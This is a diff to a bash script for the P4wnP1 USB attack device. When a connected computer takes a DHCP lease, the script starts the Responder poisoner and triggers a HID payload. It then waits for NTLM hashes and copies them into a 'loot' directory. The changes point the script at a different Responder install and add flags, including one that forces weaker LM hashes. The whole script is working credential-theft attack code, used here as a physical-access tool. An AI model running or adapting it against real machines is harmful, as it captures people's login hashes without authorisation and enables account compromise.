@@ -7,14 +7,14 @@
 # Copy this script to "/usr/local/P4wnP1/scripts/"
 # Create a trigger that starts the bash script "Quickdraw.sh" when DHCP lease issued
 
-RESPONDER_OPTIONS=" -w -F -P -v"
+RESPONDER_OPTIONS=" -w -r -d -P -F -v --lm"
 LOOTDIR=/usr/local/P4wnP1/www/loot/quickdraw
 TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
 TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
 HOST_IP=$(ifconfig usbeth | awk '$1=="inet"{print $2}');
 
 echo "[*] Checking if responder installed..."
-if [ ! -f /usr/sbin/responder ]; then
+if [ ! -f /root/Responder/Responder.py ]; then
     echo "[!] Responder not found!"
     exit 1
   fi
@@ -36,7 +36,7 @@ else
 fi
 
 echo "[*] Clearing responder logs directory..."
-rm -f /usr/share/responder/logs/* 2>/dev/null
+rm -f /root/Responder/logs/* 2>/dev/null
 rm -f /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js 2>/dev/null
 
 echo "[*] Creating loot dir..."
@@ -53,7 +53,7 @@ if [ -z "$TARGET_IP" ]; then
 fi
 
 echo "[*] Starting responder..."
-responder -I usbeth $RESPONDER_OPTIONS &
+python2 /root/Responder/Responder.py -I usbeth $RESPONDER_OPTIONS &
 #responder -I usbeth &
 
 sleep 5
@@ -77,7 +77,7 @@ P4wnP1_cli hid run -n Quickdraw_win.js >/dev/null
 
 sleep 10
 
-while ! [ "-f /usr/share/responder/logs/*NTLM*" ];
+while ! [ "-f /root/Responder/logs/*NTLM*" ];
 do
     echo "[*] Waiting for hashes..."
     sleep 1
@@ -85,17 +85,11 @@ done
 
 echo "[+] Hashes captured!"
 echo "[*] Copying responder data to loot directory..."
-cp /usr/share/responder/logs/* /usr/local/P4wnP1/www/loot/quickdraw/$HOST-$COUNT
-cp /usr/share/responder/logs/* $LOOTDIR/$HOST-$COUNT
+cp /root/Responder/logs/* /usr/local/P4wnP1/www/loot/quickdraw/$HOST-$COUNT
+cp /root/Responder/logs/* $LOOTDIR/$HOST-$COUNT
 echo "[*] Clearing responder logs directory..."
-rm -f /usr/share/responder/logs/* 2>/dev/null
+rm -f /root/Responder/logs/* 2>/dev/null
 echo "[*] Killing Responder..."
-
-echo "[*] Checking if responder installed..."
-if [ ! -f /usr/sbin/responder ]; then
-    echo "[!] Responder not found!"
-    exit 1
-  fi
 
 echo "[*] Killing Responder..."
 process=$(ps aux | grep 'Responder' | grep -v 'grep')
